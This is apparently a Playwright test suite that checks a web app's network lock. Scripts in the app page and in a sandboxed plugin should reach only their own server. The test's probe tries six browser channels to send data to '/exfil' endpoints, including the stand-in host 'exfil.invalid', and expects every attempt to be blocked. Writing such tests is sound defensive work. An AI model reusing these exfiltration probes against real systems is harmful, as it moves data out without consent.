import path from "node:path"
import type { FrameLocator, Page } from "@playwright/test"
import { expect, listLivePlugins, registerLivePlugin, test, writeLivePlugin, type ConnectionSink, type Stack } from "../harness"

type Target = { readonly name: string; readonly http: string; readonly socket: string }

const KINDS = ["fetch", "xhr", "websocket", "eventsource", "beacon", "image"] as const

const PROBE = `async (targets) => {
  const settle = (start) => new Promise((resolve) => {
    try {
      start(() => resolve("reached"), () => resolve("blocked"))
    } catch {
      resolve("blocked")
    }
  })
  const outcomes = []
  for (const target of targets) {
    const at = (via) => target.http + "/exfil?via=" + via
    outcomes.push([target.name, "fetch", await fetch(at("fetch"), { mode: "no-cors" }).then(() => "reached", () => "blocked")])
    outcomes.push([target.name, "xhr", await settle((reached, blocked) => {
      const request = new XMLHttpRequest()
      request.onload = reached
      request.onerror = blocked
      request.open("GET", at("xhr"))
      request.send()
    })])
    outcomes.push([target.name, "websocket", await settle((reached, blocked) => {
      const socket = new WebSocket(target.socket + "/exfil?via=websocket")
      socket.onopen = () => { socket.close(); reached() }
      socket.onerror = blocked
    })])
    outcomes.push([target.name, "eventsource", await settle((reached, blocked) => {
      const source = new EventSource(at("eventsource"))
      source.onopen = () => { source.close(); reached() }
      source.onerror = () => { source.close(); blocked() }
    })])
    outcomes.push([target.name, "beacon", navigator.sendBeacon(at("beacon"), "secret") ? "sent" : "refused"])
    outcomes.push([target.name, "image", await settle((reached, blocked) => {
      const image = new Image()
      image.onload = reached
      image.onerror = blocked
      image.src = at("image")
    })])
  }
  return outcomes.map((outcome) => outcome.join(" "))
}`

function probePlugin(targets: readonly Target[]) {
  return `import { createSignal, For } from "solid-js"
import { definePlugin, type PluginApi } from "@claxedo/plugin-api"

const TARGETS = ${JSON.stringify(targets)}
const probe: (targets: typeof TARGETS) => Promise<string[]> = ${PROBE}

function Probe(props: { readonly api: PluginApi }) {
  const [outcomes, setOutcomes] = createSignal<string[]>([])
  const [violations, setViolations] = createSignal<string[]>([])
  const add = (line: string) => setOutcomes((lines) => [...lines, line])
  document.addEventListener("securitypolicyviolation", (event) => setViolations((lines) => [...lines, event.effectiveDirective + " " + event.blockedURI]))
  void props.api.server.fetch("/api/claxedo/projects").then((response) => add("server " + response.status), (error) => add("server failed " + String(error)))
  void probe(TARGETS).then((lines) => lines.forEach(add))
  return (
    <section>
      <ul aria-label="Outcomes"><For each={outcomes()}>{(line) => <li>{line}</li>}</For></ul>
      <ul aria-label="Violations"><For each={violations()}>{(line) => <li>{line}</li>}</For></ul>
    </section>
  )
}

export default definePlugin({
  activate(api) {
    return api.pages.register({ id: "probe", path: "/network-probe", title: "Network probe", render: () => <Probe api={api} /> })
  },
})
`
}

function targetsFor(stack: Stack, sink: ConnectionSink): Target[] {
  const own = new URL(stack.url)
  return [
    { name: "local-port", http: sink.url, socket: `ws://127.0.0.1:${sink.port}` },
    { name: "other-origin", http: `http://localhost:${sink.port}`, socket: `ws://localhost:${sink.port}` },
    { name: "own-server-by-another-name", http: `http://localhost:${own.port}`, socket: `ws://localhost:${own.port}` },
    { name: "internet", http: "https://exfil.invalid", socket: "wss://exfil.invalid" },
  ]
}

function blockedEverywhere(targets: readonly Target[]) {
  return targets.flatMap((target) => KINDS.map((kind) => `${target.name} ${kind} ${kind === "beacon" ? "sent" : "blocked"}`))
}

function violationOrigins(violations: readonly string[], directive: string) {
  return new Set(violations.filter((line) => line.startsWith(`${directive} `)).map((line) => new URL(line.slice(directive.length + 1)).origin))
}

function expectEveryOriginViolated(violations: readonly string[], targets: readonly Target[]) {
  const connected = violationOrigins(violations, "connect-src")
  const images = violationOrigins(violations, "img-src")
  for (const target of targets) {
    expect(connected, `${target.name} connect-src`).toContain(new URL(target.http).origin)
    expect(connected, `${target.name} socket`).toContain(new URL(target.socket).origin)
    expect(images, `${target.name} img-src`).toContain(new URL(target.http).origin)
  }
}

async function listed(locator: ReturnType<Page["getByRole"]>) {
  return (await locator.getByRole("listitem").allTextContents()).map((line) => line.trim())
}

test("37 network lock: a script in the app page reaches its own server and nothing else", async ({ stack, app }) => {
  const sink = await stack.connectionSink()
  const targets = targetsFor(stack, sink)
  await app.evaluate(() => {
    const lines: string[] = []
    Object.assign(window, { probeViolations: lines })
    document.addEventListener("securitypolicyviolation", (event) => lines.push(`${event.effectiveDirective} ${event.blockedURI}`))
  })
  const outcomes = await app.evaluate(`(${PROBE})(${JSON.stringify(targets)})`)
  expect(outcomes).toEqual(blockedEverywhere(targets))
  await expect
    .poll(async () => {
      const violations = await app.evaluate(() => (window as unknown as { probeViolations: string[] }).probeViolations)
      return violations.filter((line) => line.startsWith("connect-src ") || line.startsWith("img-src ")).length
    })
    .toBeGreaterThanOrEqual(targets.length * KINDS.length)
  expectEveryOriginViolated(await app.evaluate(() => (window as unknown as { probeViolations: string[] }).probeViolations), targets)
  expect(await app.evaluate(async () => (await fetch("/api/claxedo/health")).status)).toBe(200)
  expect(sink.connections()).toBe(0)
})

async function approveInDialog(app: Page, name: string) {
  const dialog = app.getByRole("dialog", { name: `Turn on ${name}?` })
  await expect(dialog.getByRole("note")).toHaveText(/can see everything you see and act as you on your server\. It can't reach the internet\./)
  await dialog.getByRole("button", { name: "Turn on" }).click()
  await expect(dialog).toHaveCount(0)
}

function probeFrame(app: Page): FrameLocator {
  return app.getByTitle("Network probe").contentFrame()
}

test("37 network lock: a live plugin reaches its own server through the app and nothing else", async ({ stack, app }) => {
  const sink = await stack.connectionSink()
  const targets = targetsFor(stack, sink)
  const folder = await writeLivePlugin(path.join(stack.dataDir, "plugins", "probe"), { id: "probe", name: "Network probe", routes: ["/api/claxedo/projects"], app: probePlugin(targets) })
  const row = await registerLivePlugin(stack.url, folder)
  expect(row).toMatchObject({ id: "probe", status: "ready", lastError: null })
  await stack.daemon.makeWorkspace("probe", "Probe")

  await app.goto(`${stack.url}/`)
  await approveInDialog(app, "Network probe")
  await app.goto(`${stack.url}/network-probe`)
  const frame = probeFrame(app)
  const outcomes = frame.getByRole("list", { name: "Outcomes" })
  await expect(outcomes.getByRole("listitem").filter({ hasText: /^server / })).toHaveText("server 200")
  await expect.poll(async () => (await listed(outcomes)).filter((line) => !line.startsWith("server "))).toEqual(blockedEverywhere(targets))
  const violations = frame.getByRole("list", { name: "Violations" })
  await expect.poll(async () => (await listed(violations)).length).toBeGreaterThanOrEqual(targets.length * KINDS.length)
  expectEveryOriginViolated(await listed(violations), targets)
  expect(sink.connections()).toBe(0)
  expect((await listLivePlugins(stack.url)).plugins.map((plugin) => plugin.id)).toEqual(["probe"])
})
